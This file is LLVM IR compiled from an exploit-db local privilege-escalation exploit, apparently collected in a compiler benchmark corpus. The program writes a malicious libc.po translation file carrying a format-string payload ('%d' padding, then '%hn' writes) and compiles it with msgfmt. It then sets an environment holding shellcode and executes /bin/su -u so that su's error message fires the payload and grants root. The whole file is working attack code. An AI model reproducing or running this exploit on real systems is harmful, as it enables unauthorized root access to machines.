; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/immunix/local/extr_20187.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/immunix/local/extr_20187.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@PATH = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"mkdir\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"libc.po\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"fopen\00", align 1
@.str.4 = private unnamed_addr constant [313 x i8] c"%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%d%dAAAA%226d%hn%126d%hn%256d%hn%192d%hn\00", align 1
@.str.5 = private unnamed_addr constant [38 x i8] c"msgid \22%%s: invalid option -- %%c\\n\22\0A\00", align 1
@.str.6 = private unnamed_addr constant [14 x i8] c"msgstr \22%s\\n\22\00", align 1
@.str.7 = private unnamed_addr constant [35 x i8] c"/usr/bin/msgfmt libc.po -o libc.mo\00", align 1
@ENV = common dso_local global i32* null, align 8
@env = common dso_local global i32** null, align 8
@code = common dso_local global i32* null, align 8
@hacker = common dso_local global i32* null, align 8
@.str.8 = private unnamed_addr constant [72 x i8] c"ZAJEBI\EF\BF\BDCIE!!!\0AA teraz b\EF\BF\BDdziesz le\EF\BF\BDa\EF\BF\BD i ta\EF\BF\BDczy\EF\BF\BD r\EF\BF\BDczk\EF\BF\BD!\0A\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"/bin/su\00", align 1
@.str.10 = private unnamed_addr constant [3 x i8] c"su\00", align 1
@.str.11 = private unnamed_addr constant [3 x i8] c"-u\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [1024 x i8], align 16
  %3 = alloca i32*, align 8
  store i32 0, i32* %1, align 4
  %4 = load i32, i32* @PATH, align 4
  %5 = call i64 @mkdir(i32 %4, i32 493)
  %6 = icmp slt i64 %5, 0
  br i1 %6, label %7, label %9

7:                                                ; preds = %0
  %8 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  br label %9

9:                                                ; preds = %7, %0
  %10 = load i32, i32* @PATH, align 4
  %11 = call i32 @chdir(i32 %10)
  %12 = call i32* @fopen(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0))
  store i32* %12, i32** %3, align 8
  %13 = icmp ne i32* %12, null
  br i1 %13, label %17, label %14

14:                                               ; preds = %9
  %15 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0))
  %16 = call i32 @exit(i32 1) #3
  unreachable

17:                                               ; preds = %9
  %18 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %19 = call i32 @strcpy(i8* %18, i8* getelementptr inbounds ([313 x i8], [313 x i8]* @.str.4, i64 0, i64 0))
  %20 = load i32*, i32** %3, align 8
  %21 = call i32 (i32*, i8*, ...) @fprintf(i32* %20, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.5, i64 0, i64 0))
  %22 = load i32*, i32** %3, align 8
  %23 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2, i64 0, i64 0
  %24 = call i32 (i32*, i8*, ...) @fprintf(i32* %22, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.6, i64 0, i64 0), i8* %23)
  %25 = load i32*, i32** %3, align 8
  %26 = call i32 @fclose(i32* %25)
  %27 = call i32 @system(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0))
  %28 = load i32*, i32** @ENV, align 8
  %29 = load i32**, i32*** @env, align 8
  %30 = getelementptr inbounds i32*, i32** %29, i64 1
  store i32* %28, i32** %30, align 8
  %31 = load i32*, i32** @code, align 8
  %32 = load i32**, i32*** @env, align 8
  %33 = getelementptr inbounds i32*, i32** %32, i64 0
  store i32* %31, i32** %33, align 8
  %34 = load i32*, i32** @hacker, align 8
  %35 = load i32**, i32*** @env, align 8
  %36 = getelementptr inbounds i32*, i32** %35, i64 2
  store i32* %34, i32** %36, align 8
  %37 = load i32**, i32*** @env, align 8
  %38 = getelementptr inbounds i32*, i32** %37, i64 3
  store i32* null, i32** %38, align 8
  %39 = call i32 @printf(i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.8, i64 0, i64 0))
  %40 = load i32**, i32*** @env, align 8
  %41 = call i32 @execle(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.10, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0), i32* null, i32** %40)
  %42 = load i32, i32* %1, align 4
  ret i32 %42
}

declare dso_local i64 @mkdir(i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @chdir(i32) #1

declare dso_local i32* @fopen(i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @fprintf(i32*, i8*, ...) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @execle(i8*, i8*, i8*, i32*, i32**) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
